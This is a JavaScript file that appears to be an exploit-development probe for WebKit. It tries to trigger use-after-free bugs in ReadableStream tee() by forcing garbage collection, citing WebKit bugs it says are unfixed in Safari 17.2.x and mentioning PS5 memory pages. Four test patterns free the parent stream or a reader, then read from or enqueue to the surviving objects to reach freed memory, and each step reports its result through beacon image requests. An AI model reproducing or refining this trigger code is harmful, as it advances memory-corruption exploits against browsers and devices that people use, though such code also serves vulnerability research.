// p171 — ReadableStream tee() parent GC UAF
// Bug 300015: parent stream GC'd while tee branches alive (no m_relatedStreamForGC)
// Bug 303460: readers GC'd with pending read requests
// Bug 302797: StreamTeeState holding JSC::Strong incorrectly
// All three UNFIXED in Safari 17.2.x / WebKit-1200.
// InternalReadableStream uses JSC::Weak (not Strong) — GC can collect backing JSObject.
// Beacon prefix: V171-

(function() {
  var T = Date.now;
  function B(tag) {
    try { new Image().src = '/BEACON?V171-' + tag + '&t=' + T(); } catch(e) {}
  }

  B('BOOT');

  // ---- TEST 1: ReadableStream + tee availability ----
  try {
    var rs = new ReadableStream({ start: function(c) { c.close(); } });
    B('T1-RS-OK');
    var teed = rs.tee();
    B('T1-TEE-OK-' + teed.length);
    teed[0].cancel();
    teed[1].cancel();
  } catch(e) {
    B('T1-ERR-' + e.message.substring(0, 40));
    return;
  }

  // ---- TEST 2: WeakRef availability ----
  try {
    var obj = {};
    var wr = new WeakRef(obj);
    B('T2-WEAKREF-' + (wr.deref() === obj ? 'OK' : 'FAIL'));
  } catch(e) {
    B('T2-WEAKREF-ERR');
    return;
  }

  // ---- PATTERN A: Hung tee + GC pressure (Bug 300015 + 303460) ----
  function patternA() {
    B('PA-START');

    return new Promise(function(resolve) {
      var ctrl;
      var parentCollected = false;

      // Create a stream that hangs on pull (never resolves)
      var rs = new ReadableStream({
        start: function(c) { ctrl = c; },
        pull: function() { return new Promise(function() {}); } // hangs forever
      });

      // Tee it
      var branches = rs.tee();
      var b0 = branches[0];
      var b1 = branches[1];

      // Start a pending read on b0, then release and cancel
      var r0 = b0.getReader();
      r0.read(); // starts pending read — won't resolve because pull hangs

      // Release lock and cancel b0 — cancel promise hangs (pull never resolves)
      r0.releaseLock();
      b0.cancel('trigger-hang');
      B('PA-CANCELLED-B0');

      // Track parent with WeakRef
      var weakParent = new WeakRef(rs);

      // Null all refs to parent stream and b0
      rs = null;
      branches = null;
      b0 = null;
      r0 = null;

      // GC pressure — try to collect the parent stream JSObject
      // 16KB pages on PS5, allocate ~64MB of pressure
      for (var i = 0; i < 4096; i++) {
        var junk = new ArrayBuffer(16384);
      }

      // Additional GC via object churn
      for (var g = 0; g < 10; g++) {
        var arr = [];
        for (var j = 0; j < 20000; j++) arr.push({ x: j, y: String(j) });
        arr = null;
      }

      // Check if parent was collected
      setTimeout(function() {
        var deref = weakParent.deref();
        parentCollected = !deref;
        B('PA-PARENT-' + (parentCollected ? 'COLLECTED' : 'ALIVE'));

        if (parentCollected) {
          B('PA-TRIGGER-READ');
          // Parent JSObject is freed! Read from surviving b1 → accesses freed memory
          try {
            var r1 = b1.getReader();
            // Enqueue data via the controller — this goes through the freed parent
            ctrl.enqueue(new Uint8Array(64));
            B('PA-ENQUEUED');

            r1.read().then(function(result) {
              B('PA-READ-done' + result.done + '-sz' + (result.value ? result.value.length : 0));
              // Check if the data is corrupted
              if (result.value) {
                var v = new Uint8Array(result.value.buffer || result.value);
                var nonzero = 0;
                var first4 = '';
                for (var b = 0; b < Math.min(v.length, 32); b++) {
                  if (v[b] !== 0) nonzero++;
                  if (b < 4) first4 += (v[b] < 16 ? '0' : '') + v[b].toString(16);
                }
                B('PA-DATA-nz' + nonzero + '-h' + first4);
              }
              resolve('PA-READ-OK');
            }).catch(function(e) {
              B('PA-READ-ERR-' + e.message.substring(0, 30));
              resolve('PA-READ-ERR');
            });

            // Timeout fallback
            setTimeout(function() {
              B('PA-READ-TIMEOUT');
              resolve('PA-TIMEOUT');
            }, 500);
          } catch(e) {
            B('PA-TRIGGER-ERR-' + e.message.substring(0, 30));
            resolve('PA-TRIGGER-ERR');
          }
        } else {
          // Parent not collected — try harder
          B('PA-RETRY-GC');
          // More aggressive GC
          for (var i = 0; i < 8192; i++) new ArrayBuffer(16384);
          for (var g = 0; g < 20; g++) {
            var arr = [];
            for (var j = 0; j < 50000; j++) arr.push(j);
            arr = null;
          }

          setTimeout(function() {
            var deref2 = weakParent.deref();
            B('PA-RETRY-' + (deref2 ? 'STILL-ALIVE' : 'COLLECTED'));
            resolve(deref2 ? 'PA-NOT-COLLECTED' : 'PA-COLLECTED-LATE');
          }, 200);
        }
      }, 100);
    });
  }

  // ---- PATTERN B: Reader GC'd with pending reads (Bug 303460 direct) ----
  function patternB() {
    B('PB-START');

    return new Promise(function(resolve) {
      var ctrl;
      var rs = new ReadableStream({
        start: function(c) { ctrl = c; }
      });

      // Get reader and start a pending read
      var reader = rs.getReader();
      var readPromise = reader.read();
      B('PB-READ-PENDING');

      // Track reader with WeakRef
      var weakReader = new WeakRef(reader);

      // Release lock and null the reader — only the pending promise holds it
      reader.releaseLock();
      reader = null;

      // GC pressure
      for (var i = 0; i < 4096; i++) new ArrayBuffer(16384);
      for (var g = 0; g < 10; g++) {
        var arr = [];
        for (var j = 0; j < 30000; j++) arr.push({ x: j });
        arr = null;
      }

      setTimeout(function() {
        var deref = weakReader.deref();
        B('PB-READER-' + (deref ? 'ALIVE' : 'COLLECTED'));

        // Now fulfill the pending read — if reader was GC'd, this accesses freed memory
        try {
          ctrl.enqueue(new Uint8Array([0xDE, 0xAD, 0xBE, 0xEF]));
          B('PB-ENQUEUED');
        } catch(e) {
          B('PB-ENQUEUE-ERR-' + e.message.substring(0, 30));
        }

        readPromise.then(function(result) {
          B('PB-RESOLVED-done' + result.done);
          if (result.value) {
            var v = new Uint8Array(result.value.buffer || result.value);
            var hex = '';
            for (var b = 0; b < Math.min(v.length, 8); b++) hex += (v[b] < 16 ? '0' : '') + v[b].toString(16);
            B('PB-DATA-' + hex);
            // Check for corruption — expected: deadbeef
            if (v[0] !== 0xDE || v[1] !== 0xAD) {
              B('PB-CORRUPTED');
            }
          }
          resolve('PB-OK');
        }).catch(function(e) {
          B('PB-REJECT-' + e.message.substring(0, 30));
          resolve('PB-ERR');
        });

        setTimeout(function() { resolve('PB-TIMEOUT'); }, 500);
      }, 200);
    });
  }

  // ---- PATTERN C: Tee + transfer to MessageChannel (cross-realm GC) ----
  function patternC() {
    B('PC-START');

    return new Promise(function(resolve) {
      try {
        var ctrl;
        var rs = new ReadableStream({
          start: function(c) { ctrl = c; }
        });

        var branches = rs.tee();
        var weakParent = new WeakRef(rs);
        var weakB0 = new WeakRef(branches[0]);

        // Transfer one branch to a MessageChannel port
        var mc = new MessageChannel();
        mc.port2.onmessage = function(e) {
          B('PC-PORT2-MSG');
        };

        // Post branch0 as transferable (if supported)
        try {
          // ReadableStream transfer may not be supported
          mc.port1.postMessage(branches[0], [branches[0]]);
          B('PC-TRANSFER-OK');
        } catch(e) {
          B('PC-TRANSFER-ERR-' + e.message.substring(0, 30));
          // Fallback: just null the reference
        }

        // Null everything except b1 and ctrl
        var b1 = branches[1];
        rs = null;
        branches = null;

        // GC
        for (var i = 0; i < 4096; i++) new ArrayBuffer(16384);

        setTimeout(function() {
          B('PC-PARENT-' + (weakParent.deref() ? 'ALIVE' : 'COLLECTED'));
          B('PC-B0-' + (weakB0.deref() ? 'ALIVE' : 'COLLECTED'));

          // Try reading from b1 after potential parent collection
          try {
            var r = b1.getReader();
            ctrl.enqueue(new Uint8Array(32));
            r.read().then(function(result) {
              B('PC-READ-done' + result.done + '-sz' + (result.value ? result.value.length : 0));
              resolve('PC-OK');
            }).catch(function(e) {
              B('PC-READ-ERR-' + e.message.substring(0, 30));
              resolve('PC-ERR');
            });
          } catch(e) {
            B('PC-TRIGGER-ERR-' + e.message.substring(0, 30));
            resolve('PC-ERR');
          }

          setTimeout(function() { resolve('PC-TIMEOUT'); }, 500);
        }, 200);
      } catch(e) {
        B('PC-ERR-' + e.message.substring(0, 30));
        resolve('PC-ERR');
      }
    });
  }

  // ---- PATTERN D: FinalizationRegistry confirmation ----
  function patternD() {
    B('PD-START');

    return new Promise(function(resolve) {
      try {
        var collected = [];
        var fr = new FinalizationRegistry(function(tag) {
          collected.push(tag);
          B('PD-FINALIZED-' + tag);
        });

        // Register stream objects
        var ctrl;
        var rs = new ReadableStream({ start: function(c) { ctrl = c; } });
        fr.register(rs, 'parent-stream');

        var branches = rs.tee();
        fr.register(branches[0], 'branch-0');

        var b1 = branches[1];

        // Null parent and b0
        rs = null;
        branches = null;

        // GC pressure
        for (var i = 0; i < 8192; i++) new ArrayBuffer(16384);
        for (var g = 0; g < 15; g++) {
          var arr = [];
          for (var j = 0; j < 40000; j++) arr.push(j);
          arr = null;
        }

        // Wait for finalization callbacks
        setTimeout(function() {
          B('PD-COLLECTED-' + collected.length + '-' + collected.join(','));
          resolve('PD-' + collected.length);
        }, 500);
      } catch(e) {
        B('PD-ERR-' + e.message.substring(0, 30));
        resolve('PD-ERR');
      }
    });
  }

  // Run all patterns sequentially
  setTimeout(function() {
    patternA().then(function(r) {
      B('PA-RESULT-' + r);
      return patternB();
    }).then(function(r) {
      B('PB-RESULT-' + r);
      return patternC();
    }).then(function(r) {
      B('PC-RESULT-' + r);
      return patternD();
    }).then(function(r) {
      B('PD-RESULT-' + r);
      B('DONE');
    }).catch(function(e) {
      B('FATAL-' + e.message.substring(0, 40));
      B('DONE');
    });
  }, 100);
})();
